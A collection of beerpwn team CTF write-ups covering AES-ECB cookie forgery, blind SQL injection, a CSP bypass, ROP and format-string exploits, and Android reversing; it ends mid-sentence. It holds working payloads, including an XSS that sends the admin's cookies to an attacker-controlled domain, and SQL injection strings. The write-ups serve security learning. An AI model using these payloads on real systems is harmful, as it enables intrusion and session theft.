<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-beerpwn
description: CTF writeups and security challenges by beerpwn.
---

# Writeups by beerpwn

Source repository: `/repos/beerpwn`

## Repository Index

- ctf/README.md
- ctf/HTB_machines/Obscurity/README.md
- ctf/CVE/CVE-2019-13571/README.md
- ctf/2022/Wolvsec-ctf-2022/web/README.md
- ctf/2022/Codegate_CTF/web/web_cafe/readme.md
- ctf/2021/aero_CTF/web/Localization_is_hard/readme.md
- ctf/2020/securinets_CTF/pwn/README.md
- ctf/2020/pbctf/Sploosh/README.md
- ctf/2020/darkCTF/web/Chain Race/README.md
- ctf/2020/angstrom_CTF/pwn/pwn_120/readme.md
- ctf/2020/VirSecCon_CTF/web/JaWT/README.md
- ctf/2020/VirSecCon_CTF/web/eyeless/note.md
- ctf/2020/VirSecCon_CTF/pwn/return_label/README.md
- ctf/2020/SuSeC_CTF/pwn/unary/readme.md
- ctf/2020/NahamCon_CTF/web/Bomarr_Style/README.md
- ctf/2020/NahamCon_CTF/web/Flag_Jokes/README.md
- ctf/2020/Houseplant_CTF/web/readme.md
- ctf/2020/Houseplant_CTF/rev/rtcp_trivia/README.md
- ctf/2020/Houseplant_CTF/crypto/Returning_Stolen_Archives/README.md
- ctf/2019/redpwn_ctf/black_echo/Readme.md
- ctf/2019/fireshell_ctf/_leakless/README.md
- ctf/2019/WPICTF_ctf/crond_linux/README.md
- ctf/2019/UTCTF_ctf/pwn/baby_echo/README.md
- ctf/2019/UTCTF_ctf/pwn/jendys/README.md
- ctf/2019/Securinets_ctf/Beginners_Luck/README.md
- ctf/2019/Securinets_ctf/pwn/baby_1/README.md
- ctf/2019/INS'Hack_ctf/gimme_your_shell/README.md
- ctf/2019/INS'Hack_ctf/gimme_your_shell/description.md
- ctf/2019/CSAW_CTF/baby_csp/README.md
- ctf/2019/Bsides_Dheli_CTF_2019/web/README.md
- ctf/2019/BSidesSF_CTF/web/mixer/README.md

## Writeup Content


### File: ctf/2019/BSidesSF_CTF/web/mixer/README.md

### writeup by p4w @ beerPWN sec-team

# BSidesSF 2019 CTF
## Mixer crypto-web level 150pti

![alt text](screen/chall_desc.png)

Let's start login with some creds.

![alt text](screen/login.png)

As we cen see the response include a cookie "user" witch is the one we need to focus on.
Just use this cookie and see what we get back

![alt text](screen/normal_login.png)

So, my guess is:
the cookie is encrypted with AES ECB mode, and if it is that's BAD!!! ;)
In order to understand well the nex part you probably need to know some basics about ECB mode.
Since I'm not a crypto guy I suggest you to google for some good material about AES and ECB mode encryption.
Here you can just get an idea on how that works <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">Block cipher.</a>

Let's start modify user cookie at random position by just flipping one byte, in order to verify if the assumption is correct.

![alt text](screen/flip_one_byte.png)

As we can see the guess about AES ECB is probably correct, by flipping one byte we change the encrypted payload that now is no more a valid json.
Also we can see that the cookie is something like AES(json), where the json payload is:
### {"first_name":"paw","last_name":"paww","is_admin":0}

To get the flag we now need to modify the json payload to be something like this:
### {"first_name":"paw","last_name":"paww","is_admin":1}

First approach that i try was to just fuzz on the byte witch is responsible to encode the "0", but that doesn't work properly. Also as the challnge say we need to have an exact match with 1.

![alt text](screen/chall_info.png)

So i start thinking a little bit ddeper on this and it comes in my mind that if i can control an entire block of the encoded cookie with something that will be equivalent to 1, then i can reply the entire block between the <pre>"is_admin":</pre> and the <pre>0</pre> part.
So what about 1.00000000000000 ?
Note that length of 1.00000000000000 it's 16 byte.
The json payload will become:
### {"first_name":"A1.00000000000000","last_name":"paww","is_admin":1.000000000000000}
there will be one more 0 appended to the end, but this doesn't matter since is a floating point number.
and this will be also a valid json as we can see here:

![alt text](screen/json_check.png)

If we can obtain this situation then we should become admin and get the flag.
So let's give some details about wot is going on:
the lenght of <pre>{"first_name":"A</pre>
it's 16 byte and this will corresponds to the first 16 byte block of the cookie (32 character since is hex encoded), then the next 16 byte of the cookie we will have our payload <b>1.00000000000000</b> that we want to reply.
Let's copy that part and paste in the right position of the cookie.

![alt text](screen/1_00000000000000.png)

To found the righ position notice that lenght of <pre> {"first_name":"A1.00000000000000","last_name":"paww","is_admin": </pre>
is 64 byte then after that we need to paste our payload.

And here we get our flag :)
![alt text](screen/get_flag.png)

I also write a simple python script to automate the exploit.
Check it <a href="https://github.com/beerpwn/ctf/blob/master/2019/BSidesSF_CTF/web/mixer/aes_block_reply_attack.py">here</a>.



### File: ctf/2019/Bsides_Dheli_CTF_2019/web/README.md

# WRITEUP Seek You EI (Blind-SQLi)

## __Author:__ p4w @ beerpwn team
![Image desc](challenge_desc.png)
![Image desc](vuln_param.png)
<br>
First thing I had to do was to bypass the firwall that blocks the usage of `_` character. As we noticed from the image above, this character is used by a vulnerable query as GET parameter name. The first trick is based on a bahavior of php that automatically converts the `.` into `_`, so we can use this behavior to bypass the restriction.
The GET parameter is vulnerable to SQL-injection. The main problem here is that the output don't change in any way if the query match for something or not.
The first idea that I had is to leak the database using time-based technique, but unfortunately the firewall block us. I start to enumerate the firewall rules and comes out that `sleep` and `bench` words were blacklisted, then no time delay for us. Also other words match the firewall rules eg `like`,`if` etc...
After a bit of try and errors I noticed that if the query has some syntax error, the server replies with a blank response that is different from the normal one. Then __server error__ means __blank response__.
So the idea that I had was:
what if I control this behavior with a query in order to trigger a boolean condition to extract information?
The question that I had to answer now was "how can I force a server error with a query?". Well, after some time my brain comes out with an answer: using some "heavy" operation number to cause a MySQL server side error!
To do that the `pow()` function seems to be a good candidate. Behaving that the flow was correct I builded a payload to prove that.
```(SQL)
asd' OR pow(99999999, pow(99999999, pw regexp '^')) --
```
This payload will produce an error when the regex match because the regexp return 1, then the dbms has to calc `99999999^(99999999^1)` and this result should be too big; instead when the regexp fail the match then it return 0 so the dbms calc should be `99999999^(99999999^0) = 99999999^1`.
Regex match generate blank resp:
![Image poc](sqli_poc_error.png)
<br>
Regex NOT match generate resp with contents:
![Image poc](sqli_poc_not_error.png)
<br>
As you can see from the image above the techinique works like a charm so we have the control over the server error and we can build our blind exploit from this behavior.
<a href="./sqli_exploit.py">Here</a> you can find the full exploit that I written during the CTF.
And here you can see the output of the script extracting the admin pwd:

![Image of exploit](exploit_output.png)

Oh and obviously flag time ;

![Image of exploit](flag_time.png)

Cheers, p4w!



### File: ctf/2019/CSAW_CTF/baby_csp/README.md

# WRITEUP BABYCSP

## Author: p4w @beerpwn team

![Image desc](./description.png)

As the descrption/title say we will probably need to bypass CSP to trigger some XSS in order to steal the admin cookies.
Surfing to the index page we have this:

![Image desc](./index.png)

The input that we can pass is totally NOT filtered and safe from XSS.

## Understanding the CSP
The ```script-src 'self' *.google.com``` directive permit to use scripts that are coming from *.google.com, and also from the same domain.
The ```connect-src *``` directive restricts the URLs which can be loaded using script interfaces. Then in this case every URL are allowed.

## Bypassing the CSP
This is what I was thinking during the CTF:
since we can't control directily any file contents from the same domain, then we can try to 'host' some XSS payload on google subdomain. At the beginning I tried to use googleDrive to host some XSS-file but i had no lucky with that and I dind't manage to serve the raw file from google subdomains. So the second idea that comes in my mind was to use JSONP callback. More info about JSONP <a href="https://www.w3schools.com/js/js_json_jsonp.asp">here</a>. So after a bit of googling I found <a href='https://github.com/zigoo0/JSONBee'>this</a> page. So I used this ```https://cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=alert()``` endpoint for JSONP callback.

![Image index](./alert_jsonp.png)

## Fire the XSS
Now with this payload
`<script src='//cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=alert()'></script>`
we will be able to pop up an alert bypassing the CSP.
The only problem that I had to solve now is that some character are not usable with this JSONP endpoint as we can see here:

![Image index](./banned_char_enum.png)

This characters `? / ,` and probably more others are not allowed to construct the callback function.
So I comed up with this payload to avoid the bad chars:
<code>
<script src='//cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=location.replace(String.fromCharCode(47).concat(String.fromCharCode(47).concat("your-domain-here").concat(String.fromCharCode(47).concat(document.cookie))))'></script>
</code>

With this payload we can grab the admin-cookie by reading access.log file of our server:

![Image index](./server_log.png)

flag: flag{csp_will_solve_EVERYTHING}



### File: ctf/2019/INS'Hack_ctf/gimme_your_shell/README.md

### writeup by p4w@beerPWN team

# INS'HACK 2019 CTF
## gimme-your-shell PWN challnge

This is not the intended solution for this challenge since i used ROP to solve it.
We have a 64-bit <a href="./weak">binary</a> and the libc of the remote server is NOT provided.
Let's start with a little bit of reverse on the binary.
As we can see from the image below the main() function will call the vuln() function.

![alt text](images/main.png)

The assembly of vuln() function show us that dangerous function 'gets()' will be used.

![alt text](images/vuln.png)

As we can see from the man page the gets(*s) function will read until \n or EOF, but there is no control on how many byte it will read and consequently write into *s.

![alt text](images/man_gets.png)

By reading the vuln function we can see that the argument for the gets function will be a variable located into the stack.
So what we expect from this is a stack-buffer overflow.
Let's verify this:

![alt text](images/segfault.png)

Segfault! After 24 bytes we can overwrite the saved ret address.
<br>
Let's also check for the protection on the binary
```
$ checksec ./weak
Canary                        : No
NX                            : No
PIE                           : No
Fortify                       : No
RelRO                         : No
```
As we can see the binary has no protection at all. So potentially we can also inject a shellcode into the stack and jump on it, but instead of this i managed to do full ROP.
What i want to do to solve this challenge was make a memory-leak, restart execution and then ret2libc address to gain a shell.
So what i did at this point was start to find some gadgets.
```
$ ROPgadget --binary ./weak --depth 40
```

### The problem
As we can see from the dump there are NOT simple gadget like `pop rdi` to control registers.
```
$ ROPgadget --binary ./weak --depth 40 |grep pop|grep ret
0x0000000000400519 : add al, 0x20 ; add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400510 : add byte ptr [rax + 0x39], cl ; fdiv dword ptr [rdx - 0x1e] ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400509 : add byte ptr [rax - 0x75], cl ; add eax, 0x20050f ; cmp rax, rbx ; jb 0x400512 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040051b : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050c : add eax, 0x20050f ; cmp rax, rbx ; jb 0x40050f ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050e : add eax, 0x39480020 ; fdiv dword ptr [rdx - 0x1e] ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400698 : add ecx, dword ptr [rax - 0x7d] ; clc ; push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040051e : add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040051d : add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050f : and byte ptr [rax], al ; cmp rax, rbx ; jb 0x40050c ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040069b : clc ; push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040069a : cmp eax, -1 ; jne 0x40069b ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400512 : cmp eax, ebx ; jb 0x400509 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400699 : cmp rax, -1 ; jne 0x40069c ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400511 : cmp rax, rbx ; jb 0x40050a ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400513 : fdiv dword ptr [rdx - 0x1e] ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040069e : int1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400514 : jb 0x400507 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040069d : jne 0x400698 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400516 : mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400697 : mov eax, dword ptr [rbx] ; cmp rax, -1 ; jne 0x40069e ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050b : mov eax, dword ptr [rip + 0x20050f] ; cmp rax, rbx ; jb 0x400510 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400696 : mov rax, qword ptr [rbx] ; cmp rax, -1 ; jne 0x40069f ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050a : mov rax, qword ptr [rip + 0x20050f] ; cmp rax, rbx ; jb 0x400511 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400693 : or bh, bh ; ror byte ptr [rax - 0x75], 1 ; add ecx, dword ptr [rax - 0x7d] ; clc ; push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400507 : or byte ptr [rax], ah ; mov rax, qword ptr [rip + 0x20050f] ; cmp rax, rbx ; jb 0x400514 ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400522 : pop rbp ; ret
0x0000000000400521 : pop rbx ; pop rbp ; ret
0x0000000000400638 : pop rsp ; and al, 8 ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
0x000000000040069c : push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400695 : ror byte ptr [rax - 0x75], 1 ; add ecx, dword ptr [rax - 0x7d] ; clc ; push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400518 : sti ; add al, 0x20 ; add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040050d : syscall ; and byte ptr [rax], al ; cmp rax, rbx ; jb 0x40050e ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
```
Then i start to search for more complicated gadgets that chained together they will make me get control over rdi register (at least).
The first gadget that i picked was this one:
```
0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
```
and this is the second one:
```
0x0000000000400620 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
```
With the first one we can basically get control over `ebx, rbp, r12, r13, r14, r15` by writing double/quad words into the stack at the correct offsett.<br>
Then we can use the second gadget that end with a *call* instruction to make a call on a function that we want.<br>
Since for now i just want to leak some libc address i'm just interesting on controlling `rdi` register with some GOT address and then call puts@GOT.
The second gadget make a `mov edi, r13d` then we need to place leak-addr@GOT into `r13` with the first gadget in this way, when we land on the second gadget, the contents of `r13` will be placed into `rdi`.
I also need to make a call on puts() with the second gadget, then i need to set `rbx=0` and `r12=puts@GOT`, and again i can do that with the first gadget.
We just need one more little thing to make all work, look closely at the second gadgets

![alt text](images/second_gdt.png)

after the call instruction we have three instruction
```
000000000040062d         add        rbx, 0x1
0000000000400631         cmp        rbx, rbp
0000000000400634         jne        loc_400620
```
basically it's a loop. To exit from that loop and go over we need to make `rbx=rbp`, then with the first gadget we need to set `ebx=0` and `rbp=1`.
<br>
Now that we are able to leak we just need restart execution to repeat the buffer-overflow again and this time (after <a href="https://libc.blukat.me/">libc version evaluation</a>) we can overwrite the ret address with one-gadget to gain the shell.
<br>
Getting the flag :)

![alt text](images/flag.png)

You can check the full <a href="./x.py">exploit</a> here.

After the CTF, speaking with the admin I discovered that the intended way for this one was simply to jump on a shellcode since the stack was executable. I didn't manage to do it that way cause i assumed the ASLR was enabled on the remote system, but I was WRONG. Actually the ASLR was disabled and then we can predict where the shellcode will be placed. So i did a mistake but i managed to solve it in another way, and sinceraly I'm happy of that just because I learned more by doing it.
<br>
Cheers, p4w ;)



### File: ctf/2019/Securinets_ctf/Beginners_Luck/README.md

# Beginner's Luck Writeup

## __Author:__ bytevsbyte @ beerpwn team

This was a web challenge, and we had the source files of some php pages.
All begin with a request to index.php and then we are redirected to
the play.php page where we can see a token and a string that tells us
that we are not lucky and we must retry.\
The index.php just generate a new token for a client, and insert it in
a new row (IP, TOKEN) into users database table.
So, each IP has its token associated.
There is also a counter and after ten tries we must start again.\
Now it's time of next file, play.php.
Maybe here there is.. ohhh a SQL injection :)

![Image of flag](./code_sqlinj.png)

The val POST variable is used in the query string as it is, BAD! (or good for us)\
There isn't a direct output, so we had to go blind.
But, we have a positive text in the server response
if we sent a right token (_True_) and negative otherwise
(_Better luck next time !_).
This is a beautiful thing.\
I tested the SQL injection with:

```sql
' OR token LIKE '%' --  
```

and I obtained _`True`_, so it works.\
From now on I use a match with substring because I want an exact match.
With _`substring(token,1,index)=part_of_token`_ or
_`substring(token,index,index)=character`_ we can steal it incrementally
(the part of string or character is correct if the server answer with _True_).

But now there is a big __problem__, the limited number of requests we have
before the token must be renewed.

So, after ten tries we have to restart and the token is regenerated,
and all our efforts are gone!\
But, we have complete control of the query,
and we can add to the injection the matching
a different IP, so we can steal the token of someone else.\
The SQL injection became something like:

```sql
' OR ip='x.x.x.x' AND substring(token,1,index)=xxxx --  
```

I used the beerpwn server to make the first request to the challenge with curl.
After the creation of the row in the db I use my pc at home
to steal the token of the server. \
The limitation of ten requests remains but now it's not a problem because,
the token renewed is of the pc at home not the server and after the
request index.php I can continue with other 10 requests, and so on.\
You can find the script in python that I created [HERE](./exploit.py).

At the end, I submitted the flag from the server,
due to the check on the IP.

![Image of flag](./beginnersluck_flag.png)



### File: ctf/2019/Securinets_ctf/pwn/baby_1/README.md

### writeup by p4w@beerPWN team

# Securinets 2019 CTF
## baby_1 PWN challnge


We have a 64-bit binary and the libc of the remote server.
Quickly we can notice that there is a stack buffer overflow in the main() function that read from stdin.
The main problem of this pwn challenge was that the register rdx will be xored with himself at the end of the main() function as you can see from the disassembly.

![alt text](main_xor.png)

Then the register will contain 0x0 when we actually get the control over rip register.
We need to leak some address, and we want to do that by using the write() function, but we need some gadgets to set the registers rdi, rsi, and rdx.
This because the write function expect 3 params (in 64-bit mode the arguments are passed via registers).
For the first 2 params we have two good and easy gadgets that allow us to set rdi and rsi registers.

```0x00000000004006c3 # pop rdi ; ret```
```0x00000000004006c1 # pop rsi ; pop r15 ; ret```

For the rdx register... well we need to use some more creative gadgets:

![alt text](pops_gdt.png)
![alt text](gadget_mov_call.png)

With this in mind we can buld the exploit that:
1) leak address from GOT
2) restart execution
3) evaluate libc_offset
4) own the executable by smash the stack and ret2libc on system()

you can check the full <a href="./exploit.py">exploit</a> here.


### File: ctf/2019/UTCTF_ctf/pwn/baby_echo/README.md

### writeup by P4W @ beerPWN sec-team

# UTCTF 2019 CTF
## BabyEcho's pwn level 700 pti

Basic analyzes on the binary.
<pre>
$ file pwnable
pwnable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ec115d32827da438599fe9b40b626d7214aa4e73, not stripped
</pre>
<pre>
gef➤  checksec
[+] checksec for 'pwnable'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
</pre>
So the GOT table is writable fortunatly for us.
By simply run the binary and passing <pre>%p.%p.%p</pre> as input we can verify that it's a <a href='https://it.wikipedia.org/wiki/Format_string_attack'>format string</a> challenge.
Next step is just try to figure out how we can exploit this.
Since the GOT has write permission then we can abuse this using the format string and overwrite some entry in the GOT table.
First thing that we can do is overwrite the GOT entry for the exit() function with the address of main() func, in this way we can restart the execution.
After that we just have to leak some libc address using the format string and overwrite the printf@GOT with the address of the system address.
In this way we can drop a shell by just passing the string "sh" to the printf function that now will be point to the system address.
<a href='exploit.py'>Here</a> you can find the full exploit.



### File: ctf/2019/UTCTF_ctf/pwn/jendys/README.md

### writeup by sk4 @ beerPWN sec-team

# UTCTF 2019 CTF
## Jendy's pwn level 1400 pti

<a href="https://exploitnetworking.com/en/security-en/jendys">Here</a> there is the original writeup. For test the exploit, download this repository:

<pre> git clone https://github.com/beerpwn/ctf.git </pre>

Move in directory:

<pre> cd ctf/2019/UTCTF_ctf/pwn/jendys </pre>

And run the configuration docker file:

<pre>docker build .</pre>

After that get the ip address of the docker container, for example 172.17.0.2 and replace "ipaddress" line in  <a href="https://github.com/beerpwn/ctf/blob/master/2019/UTCTF_ctf/pwn/jendys/exploit.py">exploit.py</a> with the ip address:

<pre>p = remote('172.17.0.2', 2323)</pre>

and finally run the exploit.py:

<pre> python exploit.py </pre>



### File: ctf/2019/WPICTF_ctf/crond_linux/README.md

# Crond Writeup (Linux challenge)

## __Author:__ bytevsbyte @ beerpwn team

The challenge provides ssh access as __ctf__ user.\
At the first glance, it seems there are no interesting files on the machine.
In `/home/ctf/` as in other path there is no trace of flag.\
The name of the challenge refers to cron so I search for all possible cron file
and check my cron with _crontab_, but this command doesn't exist.\
With find, and _"\*cron\*"_ as search string, I get the __/usr/bin/fakecronsh__ file,
interesting!\
Before examining the file, I want to enumerate a little more.\
In case of repetitive tasks, looking at what processes are spawned in a time range
can reveal a lot of things.\
I could run __ps__ so I can look for something useful.. and ps was not found :'(\
Ok, I can see processes the same way with `ls -al /proc/`:

![Image of ps](./files/ps_ax.png)

There are some processes owned by root. In the figure the process with pid 21975
dead and spawn with new PID continuously. But the 7 and 8 are always alive.
With `cat /proc/7/cmdline` can be retrieved the original command:

![Image of fakecron](./files/fake_cronsh_crop.png)

The same fakecron that I found with _find_ command.
This is the right way!\
Look at the script to figure out what it does.

[Script](./fakecron.sh)

So, there's a `/etc/deadline` file and the values _target\_second_, _target\_minute_..
are loaded each loop iteration from this. Note that I have write permission on this file.\
The _second_, _minute_, _hour_.. are initialized with hardcoded integers in the script
and are incremented at each iteration.\
The flag part here resides in the _if_ statement.
There's a commented line with _echo_ of possible flag into `/home/ctf/flag.txt`.\
Below this there is the __exec_flag__ command, that I hope it does the same thing.

![Image if script](./files/ifcondition.png)

All variables must be equal to their relative _target\_xxx_ to satisfy the condition.
I need those numbers!!!\
Fortunatelly they are written in the `/etc/faketimerc` with different format.\
Ok.. I can read the current (one second before) values from __faketimerc__ and put them,
in the correct format, into the __deadline__ file.\
At the end I could check if there is a flag file in the home dir.
Note the second value that is +1:

```(bash)
while [ 1 -eq 1 ]; do
    faket=`cut -d ' ' -f2 /etc/faketimerc`
    h=`echo $faket | cut -d ':' -f1`;
    m=`echo $faket | cut -d ':' -f2`;
    s=`echo $faket | cut -d ':' -f3`;
    echo "FAKETIME: $faket";
    echo "2019 1 1 $h $m $((s+1))" | tee /etc/deadline
    cat /etc/faketimerc;
    ls -al /home/ctf
done
```

Perfect, all done, all ready!\
Launch it and ... It doesn't work. No flag.txt was created. Good!\
I tried to find the mistake paying more attention to the if in _fakecron_:

![Image if script edit](./files/ifcondition_edit.png)

Ohhh, son of a ... hour and seconds in fakecron are inverted!\
This is the one line version of my previous script __fixed__:

```(sh)
while [ 1 -eq 1 ]; do faket=`cut -d ' ' -f2 /etc/faketimerc`; h=`echo $faket | cut -d ':' -f1`; m=`echo $faket | cut -d ':' -f2`; s=`echo $faket | cut -d ':' -f3`; echo "FAKETIME: $faket"; echo "2019 1 1 $((s+1)) $m $h" | tee /etc/deadline; cat /etc/faketimerc; ls -al /home/ctf; done
```

And finally I have the flag!

![Image if script edit](./files/output_flag.png)


### File: ctf/2019/fireshell_ctf/_leakless/README.md

 
We have a 32-bit ELF binary and libc is NOT provided:

<pre>
$ file leakless
leakless: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=168034ba2b6802df6058a4ceede506ffaf8dabb3, not strippeded
</pre>

Run the binary:
<pre>
$ ./leakless 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Errore di segmentazione (core dump creato)
</pre>
and we get a segfault! :)

Also the binary seems dont use puts or printf, but if we analyze a bit we found:<br>
<pre>
$ rabin2 -s leakless | grep puts
004 0x000003f0 0x080483f0 GLOBAL   FUNC   16 imp.puts
</pre>

Quick reverse reveal that the function puts is used just in the handler function wich is called by the setup func that is (finally) called by main function.
<br>
Let's now analyze the protection that are enabled on this binary(assuming ASLR is active on the remote server):
<br>
<pre>
gef➤  checksec 
[+] checksec for 'leakless'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
</pre>
<br>

With that in mind we can start figure out our exploit.
Use the buffer overflow to override the ret addr and get control on eip, use <a href='https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833'>ret2libc</a> to leak some GOT addr and return into main func.
The leak payload will be like this <pre>[A x off][puts_plt][main_addr][some_GOT_addr]</pre>
After that we can serch for libc version. I used this site <a href='https://libc.blukat.me'>https://libc.blukat.me</a> to evaluate libc version.
<br>
Generate the final payload <pre>[A x off][system_libc][junk][/bin/sh]</pre> and send it.


### File: ctf/2020/Houseplant_CTF/crypto/Returning_Stolen_Archives/README.md

### Author: p4w
* The text is encrypted one char at the time with a pretty secure n.
* We can exploit it by bruteforcing all character one by one and compair with the encrypted text
* Exploit <a href='./rsa_char_by_char_exploit.py'>here</a>



### File: ctf/2020/Houseplant_CTF/rev/rtcp_trivia/README.md

#### Writeup by <a href="https://twitter.com/sk4pwn">@sk4</a>

### RTCP TRIVIA
This week I've partecipate to Houseplant CTF.
This blogpost is related to a nice Android reverse engineering challenge: RTCP TRIVIA.

The challenge description was: "We now have our very own trivia app! Solve 1000 questions and win a flag!". Ok, try to do it 😉.

#### Decompile the apk
The first step, after download the client.apk, was try to decompile it. I've used the utility ```apkx```, that you can find in his <a href="https://github.com/b-mueller/apkx">official repository</a>, that permit you to obtain the java code of the apk.
```
$ apkx client.apk
Extracting client.apk to client
Converting: classes.dex -> classes.jar (dex2jar)
dex2jar client/classes.dex -> client/classes.jar
Detail Error Information in File ./classes-error.zip
Please report this file to http://code.google.com/p/dex2jar/issues/entry if possible.
Decompiling to client/src (cfr)
```
The code of the application it's saved on ```client``` directory. Inspecting the code, it was possible to see some relevant classes inside ```client/wtf/riceteacatpanda/quiz``` directory:

* MainActivity.java
* LoggedIn.java
* Game.java
* Flag.java

In MainActivity.java class, there were some interesting lines that suggest such communication with a server using the websockets, like this line:
```
...
string = object2.a("Sec-WebSocket-Accept");
...
```
The next step, then, was run the application in an emulator or an Android device, setting up a proxy for check eventuals websocket communications.

#### Running and proxy
The main activity was a form login with an input text for the username and a login button:

![Main Activity](img/mainactivity2.png)

I have tried to insert an username and press the login button and a websocket request was sent to a server, how I've seen in my BurpSuite proxy:

![First request](img/websocket1.PNG "First request")

After the login there was the LoggedIn activity with only a *play* button:

![Loggedin Activity](img/play2.png "LoggedIn Activity")

Pressing the button, a websocket request happened with a reply by the server:

![Second request](img/websocket2.PNG "Second request")

In the response, there was the first question that I had to answer correctly, but it was all encrypted, then I had to reverse the code of the apk for see how the answer was encrypted and decrypted.

#### Get the encryption keys
Looking at the code of the Game activity, I've seen that some lines are used to create a new `cipher` object:

```
...
jSONObject = new JSONObject(this.d);
cipher = new nx(Game.this.getIntent().getStringExtra("id"), Game.this.getResources()).a();
object = jSONObject.getString("id");
object2 = new StringBuilder();
object2.append((String)cipher);
object2.append(":");
object2.append((String)object);
object = nx.a(object2.toString());
cipher = nx.b(jSONObject.getString("requestIdentifier"));
object = new byte[]((byte[])object, "AES");
object2 = new IvParameterSpec((byte[])cipher);
cipher = Cipher.getInstance((String)"AES/CBC/PKCS7Padding");
cipher.init(2, (Key)object, (AlgorithmParameterSpec)object2);
object = cipher.doFinal(Base64.decode((String)jSONObject.getString("questionText"), (int)0));
...
```

The line with the following code: `cipher = Cipher.getInstance((String)"AES/CBC/PKCS7Padding");` suggested an AES cipher, then the next step was search what *key* and *iv* was used for the encryption.\
The *iv* was initialized with the following code: `object2 = new IvParameterSpec((byte[])cipher);` where the cipher variable was created with `cipher = nx.b(jSONObject.getString("requestIdentifier"));`, then I had to going into the `nx` class to see what `b` function does. This class was in the `client/nx.java` file, and the implementation of `b` function was:

```
public static byte[] b(String string) {
    int n2 = string.length();
    byte[] arrby = new byte[n2 / 2];
    for (int i2 = 0; i2 < n2; i2 += 2) {
        arrby[i2 / 2] = (byte)((Character.digit((char)string.charAt(i2), (int)16) << 4) + Character.digit((char)string.charAt(i2 + 1), (int)16));
    }
    return arrby;
}
```

Reverse this function was complex, then I've created a *frida* script for hooking at runtime the `b` function and see his input and output😆:

```
Java.perform(function () {
    var nx = Java.use('nx');
    nx.b.implementation = function(x) {
      console.log(x);
      var tmp = this.b.call(this, x);
      console.log(JSON.stringify(tmp));
      return tmp;
    }
});
```

Then I've started the frida server on my Android device:

```
adb shell
santoni:/ $ su
santoni:/ # cd data/local/tmp
santoni:/data/local/tmp # ./frida-server-12.8.20
```

and run my *frida* script with the following command:
```
